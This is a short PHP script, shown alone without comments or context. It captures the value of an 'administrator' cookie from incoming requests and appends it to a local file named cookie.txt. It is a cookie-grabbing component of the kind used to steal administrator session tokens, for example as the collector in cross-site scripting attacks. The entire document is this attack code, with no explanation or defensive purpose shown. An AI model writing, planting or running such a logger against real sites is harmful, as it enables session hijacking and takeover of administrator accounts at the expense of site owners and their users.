<?php 
$cookie = $_COOKIE['administrator'];
$file = fopen('cookie.txt', 'a');
fwrite($file, $cookie);
?>